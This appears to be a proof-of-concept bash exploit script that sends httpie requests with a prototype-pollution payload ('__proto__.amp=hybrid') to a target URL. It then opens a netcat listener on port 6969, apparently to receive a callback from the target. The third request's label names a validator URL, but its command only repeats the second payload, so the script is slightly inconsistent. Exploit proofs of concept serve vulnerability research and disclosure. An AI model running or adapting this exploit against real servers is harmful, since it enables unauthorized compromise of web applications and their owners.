#!/usr/bin/env bash

echo "request 1: /"
http --quiet $1

echo "request 2: /?amp=1&__proto__.amp=hybrid"
http --quiet $1/\?amp\=1\&__proto__.amp\=hybrid

echo "request 3: /?validator=[link]"
http --quiet --timeout=5 $1/\?amp\=1\&__proto__.amp\=hybrid

nc -klvp 6969
